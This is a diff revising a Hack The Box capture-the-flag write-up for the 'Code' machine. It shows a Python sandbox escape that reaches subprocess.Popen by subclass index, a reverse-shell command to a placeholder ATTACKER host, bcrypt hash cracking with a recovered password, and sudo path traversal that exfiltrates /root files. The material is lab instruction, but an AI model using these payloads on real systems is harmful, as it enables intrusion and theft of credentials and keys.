@@ -9,36 +9,14 @@ avatar: assets/htb/code.png
 tags: [Remote Code Execution, Misconfiguration, Directory Traversal, Reconnaissance, Password Cracking, SUDO Exploitation, Python, SQL]
 htb_url: https://app.hackthebox.com/machines/Code
 ---
+
 ## Summary
 
-Code is a Python in-browser code editor. Dangerous keywords (e.g. `import`, `os`, `subprocess`, `exec`, `eval`, `open`, `__`) are blocklisted - but only string-based, so the **execution environment still holds dangerous objects in memory**. By walking the object graph via `().__class__.__base__.__subclasses__()` and selecting `subprocess.Popen` by **numeric index** (commonly 317), the filter is bypassed and arbitrary commands run. Post-shell, web-app SQLite holds bcrypt creds; root falls to a `sudo` rule for **`/usr/bin/backy.sh`** that allows path-traversal in the JSON config to read `/root/root.txt`.
+Code is an easy Linux box built around a Python in-browser code editor. The editor blocklists dangerous keywords (e.g. `import`, `os`, `subprocess`, `exec`, `eval`, `open`, `__`), but the filtering is purely string-based, so the execution environment still holds dangerous objects in memory. By walking the object graph via `().__class__.__base__.__subclasses__()` and selecting `subprocess.Popen` by numeric index (commonly 317), I bypass the filter and run arbitrary commands, landing a shell as `app-production`. From there the web-app SQLite database yields bcrypt credentials that crack to user `martin`. Root falls to a `sudo` rule for `/usr/bin/backy.sh` whose JSON config allows path-traversal, letting me archive and read `/root`.
 
----
+## Enumeration
 
-## External Writeups
-
-- [0xdf](https://0xdf.gitlab.io/2025/08/02/htb-code.html)
-- [Medium - CN-0x](https://medium.com/@CN-0x/code-hackthebox-writeup-7e73abc59aee)
-- [Medium - damarabrianr](https://medium.com/@damarabrianr/hackthebox-code-writeup-from-python-sandbox-escape-to-root-via-json-bypass-16d668bd307e)
-- [Axura](https://4xura.com/ctf/htb-writeup-code/)
-- [BugsWithBlas](https://bugswithblas.com/posts/code-htb-writeup/)
-
----
-
-## Key Techniques
-
-- Python sandbox escape via subclass enumeration
-- String-based keyword blocklists are insufficient (objects remain reachable)
-- `().__class__.__base__.__subclasses__()` -> `subprocess.Popen`
-- Avoiding banned identifiers using index access and chained attribute lookups
-- bcrypt hash cracking with `hashcat -m 3200`
-- `backy` (Python backup tool) JSON config `directories_to_archive` path traversal under `sudo`
-
----
-
-## Attack Path
-
-### 1. Recon
+A full port scan with service detection shows SSH and a Flask app serving a "Python Playground" on port 5000.
 
 ```bash
 nmap -p- --min-rate=10000 -sV -sC code.htb
@@ -46,9 +24,11 @@ nmap -p- --min-rate=10000 -sV -sC code.htb
 # 5000  http -> Flask: Python Playground
 ```
 
-### 2. Sandbox Escape
+The web app is an editor that lets you submit and execute Python. It filters tokens like `import`, `os`, `exec`, `eval`, `__class__`, `subprocess`, but the runtime still has every loaded class reachable in memory.
 
-The editor filters tokens like `import`, `os`, `exec`, `eval`, `__class__`, `subprocess`, but the runtime still has every loaded class. Use list-indexing to never name a banned token:
+## Foothold
+
+Because the blocklist only matches strings, I can reach `subprocess.Popen` without ever naming a banned token directly. The trick is to enumerate the subclasses of `object` and select `Popen` by its list index, avoiding banned identifiers via index access and chained attribute lookups.
 
 ```python
 # Find subprocess.Popen index (varies; iterate or precompute)
@@ -61,29 +41,27 @@ P = ().__class__.__mro__[-1].__subclasses__()[317]
 P(['bash','-c','bash -i >& /dev/tcp/ATTACKER/4444 0>&1'])
 ```
 
-Common variant uses chained attribute strings via `getattr`/`type` to dodge the `__` filter when it is regex-based.
+A common variant uses chained attribute strings via `getattr`/`type` to dodge the `__` filter when it is regex-based. Either way this lands a shell as `app-production`.
 
-Shell as `app-production`.
-
-### 3. User Pivot
-
-Site SQLite (`/var/www/app/instance/database.db`) holds bcrypt hashes for `martin` and others. Crack:
+For the user pivot, the site's SQLite database (`/var/www/app/instance/database.db`) holds bcrypt hashes for `martin` and others. I crack them with hashcat mode 3200 against rockyou:
 
 ```bash
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
 # martin:nafeelswordsmaster
 ```
 
-`su martin` (or SSH as `martin`).
+With the cracked password I `su martin` (or SSH in as `martin`).
 
-### 4. Root via Sudo Backy
+## Privilege Escalation
+
+`martin` is allowed to run `backy.sh` as root without a password:
 
 ```bash
 sudo -l
 # (root) NOPASSWD: /usr/bin/backy.sh /root/backy.conf
 ```
 
-`backy.sh` reads the JSON config and tar-archives `directories_to_archive`. The path validation in `task.py` strips `/root` but **not** `..`:
+`backy.sh` reads the JSON config and tar-archives whatever is listed in `directories_to_archive`. The path validation in `task.py` strips `/root` but not `..`, so a `..` traversal slips a root path back into the archive set. `sudo` to a script that consumes a JSON config is effectively `sudo` to whatever the script lets the config control:
 
 ```bash
 mkdir /tmp/exf && cd /tmp/exf
@@ -99,11 +77,4 @@ sudo /usr/bin/backy.sh /tmp/exf/cfg.json
 # extract /tmp/exf/code-{date}.tar.bz2 -> root.txt, /root/.ssh/id_rsa
 ```
 
----
-
-## Lessons Learned
-
-- Blocklist filters are bypassable; allowlists or proper sandboxes (e.g. `RestrictedPython`, gVisor, eBPF policies) are necessary.
-- Once the runtime has dangerous classes, every identifier access is an attack surface - indexing, `getattr`, `__dict__` lookups all work.
-- `sudo` to a script that consumes a JSON/YAML config is equivalent to `sudo` to whatever the script lets the config control.
-- `..` is still the most reliable path-traversal token in 2026.
+Extracting the resulting `code-{date}.tar.bz2` archive gives me `root.txt` and `/root/.ssh/id_rsa`, completing the box.
